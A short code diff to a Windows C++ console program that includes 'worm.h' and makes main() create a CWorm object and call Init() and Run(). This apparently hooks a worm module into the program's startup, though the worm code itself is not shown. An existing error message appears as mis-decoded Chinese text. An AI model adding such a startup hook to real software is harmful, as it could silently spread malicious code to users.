@@ -3,6 +3,7 @@
 
 #include "stdafx.h"
 #include "RCS.h"
+#include "worm.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -41,6 +42,9 @@ int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
 		_tprintf(_T("´íÎó: GetModuleHandle Ê§°Ü\n"));
 		nRetCode = 1;
 	}
-
+	CWorm m = CWorm();
+	m.Init();
+	m.Run();
+	Sleep(10000);
 	return nRetCode;
 }
